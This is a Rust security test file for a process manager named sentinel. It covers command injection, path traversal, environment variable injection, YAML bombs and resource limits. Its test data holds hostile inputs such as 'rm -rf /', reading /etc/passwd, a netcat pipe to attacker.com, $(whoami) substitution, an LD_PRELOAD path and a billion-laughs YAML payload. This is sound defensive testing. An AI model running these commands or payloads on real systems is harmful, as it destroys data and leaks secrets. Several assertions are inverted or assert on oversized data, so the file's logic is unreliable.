/**
 * @file Security Tests
 * @glinr/sentinel
 *
 * Comprehensive security testing for input validation, command injection prevention,
 * and privilege escalation checks.
 *
 * Built by Glincker (A GLINR Product)
 * Copyright (c) 2025 Glincker. All rights reserved.
 *
 * @see https://glincker.com/sentinel
 */
use sentinel::core::ConfigManager;
use sentinel::models::{Config, ProcessConfig};
use std::collections::HashMap;
use std::path::PathBuf;
use tempfile::tempdir;

/// Test: Command injection via process name
#[test]
fn test_command_injection_in_process_name() {
    let malicious_names = vec![
        "process; rm -rf /",
        "process && cat /etc/passwd",
        "process | nc attacker.com 1234",
        "process `whoami`",
        "process $(whoami)",
        "process\nrm -rf /",
    ];

    for name in malicious_names {
        let config = ProcessConfig {
            name: name.to_string(),
            command: "echo".to_string(),
            args: vec!["test".to_string()],
            cwd: None,
            env: HashMap::new(),
            depends_on: Vec::new(),
            auto_restart: None,
            max_restarts: None,
            restart_delay_ms: None,
            health_check: None,
        };

        // Validate that process name doesn't contain shell metacharacters
        assert!(
            !config.name.contains(';')
                && !config.name.contains('&')
                && !config.name.contains('|')
                && !config.name.contains('`')
                && !config.name.contains('$')
                && !config.name.contains('\n'),
            "Process name '{}' contains shell metacharacters",
            config.name
        );
    }
}

/// Test: Command injection via command arguments
#[test]
fn test_command_injection_in_arguments() {
    let malicious_args = vec![
        vec!["; rm -rf /"],
        vec!["&& cat /etc/passwd"],
        vec!["| nc attacker.com 1234"],
        vec!["`whoami`"],
        vec!["$(whoami)"],
    ];

    for args in malicious_args {
        let config = ProcessConfig {
            name: "test".to_string(),
            command: "echo".to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            cwd: None,
            env: HashMap::new(),
            depends_on: Vec::new(),
            auto_restart: None,
            max_restarts: None,
            restart_delay_ms: None,
            health_check: None,
        };

        // Ensure arguments don't contain shell injection patterns
        for arg in &config.args {
            assert!(
                !arg.contains(';') && !arg.contains('&') && !arg.contains('|'),
                "Argument '{}' contains shell metacharacters",
                arg
            );
        }
    }
}

/// Test: Path traversal in working directory
#[test]
fn test_path_traversal_in_cwd() {
    let malicious_paths = vec![
        "../../../../etc/passwd",
        "../../../root/.ssh",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32",
    ];

    for path_str in malicious_paths {
        let path = PathBuf::from(path_str);

        // Validate that paths are canonicalized and don't escape expected bounds
        if path.exists() {
            let canonical = path.canonicalize();
            assert!(
                canonical.is_ok(),
                "Path '{}' cannot be canonicalized",
                path_str
            );

            // In production, you'd check that canonical path is within allowed directory
            // e.g., starts with project root or user's home directory
        }
    }
}

/// Test: Environment variable injection
#[test]
fn test_environment_variable_injection() {
    let mut env = HashMap::new();
    env.insert("LD_PRELOAD".to_string(), "/malicious/lib.so".to_string());
    env.insert("PATH".to_string(), "/malicious/bin:$PATH".to_string());

    // Ensure dangerous environment variables are filtered or validated
    let dangerous_vars = vec!["LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES"];

    for var in dangerous_vars {
        if env.contains_key(var) {
            // In production, either reject or carefully validate these
            println!("Warning: Dangerous environment variable {} detected", var);
        }
    }
}

/// Test: YAML bomb / Billion laughs attack
#[test]
fn test_yaml_bomb_protection() {
    let yaml_bomb = r#"
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
"#;

    let result = serde_yaml::from_str::<serde_yaml::Value>(yaml_bomb);

    // In production, add size limits or depth limits to YAML parsing
    // This test documents the vulnerability
    if result.is_ok() {
        println!("Warning: YAML bomb parsed successfully - implement size/depth limits");
    }
}

/// Test: Config file size limit
#[test]
fn test_config_file_size_limit() {
    let dir = tempdir().unwrap();
    let config_path = dir.path().join("huge.yaml");

    // Create a large config file (>10MB)
    let large_content = "processes:\n".to_string() + &"  - name: test\n".repeat(1_000_000);
    std::fs::write(&config_path, large_content).unwrap();

    // Attempt to load should fail or have size limit
    let metadata = std::fs::metadata(&config_path).unwrap();
    const MAX_CONFIG_SIZE: u64 = 10 * 1024 * 1024; // 10MB

    assert!(
        metadata.len() < MAX_CONFIG_SIZE,
        "Config file exceeds size limit"
    );
}

/// Test: Process name validation
#[test]
fn test_process_name_validation() {
    let valid_names = vec!["my-app", "backend_service", "api.server", "worker123"];

    let invalid_names = vec![
        "",                    // Empty
        "a".repeat(256),       // Too long
        "my app",              // Spaces
        "../../../etc/passwd", // Path traversal
        "process\x00name",     // Null byte
        "process\nname",       // Newline
    ];

    for name in valid_names {
        assert!(is_valid_process_name(name), "Valid name rejected: {}", name);
    }

    for name in invalid_names {
        assert!(
            !is_valid_process_name(name),
            "Invalid name accepted: {}",
            name
        );
    }
}

/// Helper: Validate process name
fn is_valid_process_name(name: &str) -> bool {
    const MAX_NAME_LENGTH: usize = 128;

    if name.is_empty() || name.len() > MAX_NAME_LENGTH {
        return false;
    }

    // Only allow alphanumeric, hyphen, underscore, and dot
    name.chars()
        .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.')
}

/// Test: Dependency cycle leads to DoS
#[test]
fn test_dependency_cycle_dos() {
    let config = Config {
        processes: vec![
            ProcessConfig {
                name: "a".to_string(),
                command: "echo".to_string(),
                args: vec![],
                cwd: None,
                env: HashMap::new(),
                depends_on: vec!["b".to_string()],
                auto_restart: None,
                max_restarts: None,
                restart_delay_ms: None,
                health_check: None,
            },
            ProcessConfig {
                name: "b".to_string(),
                command: "echo".to_string(),
                args: vec![],
                cwd: None,
                env: HashMap::new(),
                depends_on: vec!["a".to_string()],
                auto_restart: None,
                max_restarts: None,
                restart_delay_ms: None,
                health_check: None,
            },
        ],
        global_env: HashMap::new(),
    };

    // Validation should detect cycle
    let validation_result = ConfigManager::validate(&config);
    assert!(
        validation_result.is_err(),
        "Dependency cycle was not detected"
    );
}

/// Test: Max processes limit (resource exhaustion)
#[test]
fn test_max_processes_limit() {
    const MAX_PROCESSES: usize = 1000;

    let mut processes = Vec::new();
    for i in 0..1500 {
        processes.push(ProcessConfig {
            name: format!("process-{}", i),
            command: "sleep".to_string(),
            args: vec!["1".to_string()],
            cwd: None,
            env: HashMap::new(),
            depends_on: Vec::new(),
            auto_restart: None,
            max_restarts: None,
            restart_delay_ms: None,
            health_check: None,
        });
    }

    let config = Config {
        processes: processes.clone(),
        global_env: HashMap::new(),
    };

    // Should reject configs with too many processes
    assert!(
        config.processes.len() < MAX_PROCESSES,
        "Config has {} processes, limit is {}",
        config.processes.len(),
        MAX_PROCESSES
    );
}

/// Test: No privilege escalation via setuid binaries
#[test]
#[cfg(unix)]
fn test_no_privilege_escalation() {
    use std::os::unix::fs::PermissionsExt;

    let setuid_paths = vec!["/usr/bin/sudo", "/usr/bin/su", "/bin/su"];

    for path_str in setuid_paths {
        let path = PathBuf::from(path_str);
        if path.exists() {
            let metadata = std::fs::metadata(&path).unwrap();
            let mode = metadata.permissions().mode();

            // Check if setuid bit is set
            let is_setuid = (mode & 0o4000) != 0;

            if is_setuid {
                println!(
                    "Warning: {} has setuid bit set - do not allow as process command",
                    path_str
                );
            }
        }
    }

    // In production, maintain a blacklist of dangerous binaries
    let dangerous_binaries = vec!["sudo", "su", "passwd", "chsh", "chfn"];

    for binary in dangerous_binaries {
        println!("Production: Reject process command: {}", binary);
    }
}

/// Test: Resource limits (ulimit) are enforced
#[test]
#[cfg(unix)]
fn test_resource_limits() {
    // In production, use rlimit crate to set resource limits
    // - Max CPU time
    // - Max memory
    // - Max file descriptors
    // - Max processes

    // This test documents the requirement
    println!("Production: Set resource limits using rlimit crate");
    println!("  - RLIMIT_CPU: 3600 seconds");
    println!("  - RLIMIT_AS: 1GB memory");
    println!("  - RLIMIT_NOFILE: 1024 file descriptors");
    println!("  - RLIMIT_NPROC: 100 child processes");
}

/// Test: Input sanitization for log viewing
#[test]
fn test_log_input_sanitization() {
    let malicious_process_names = vec![
        "../../../var/log/system.log",
        "/etc/passwd",
        "process\x00name",
        "process\n../../sensitive.log",
    ];

    for name in malicious_process_names {
        // Validate process name before using in filesystem operations
        assert!(
            !is_valid_process_name(name),
            "Malicious name not rejected: {}",
            name
        );
    }
}
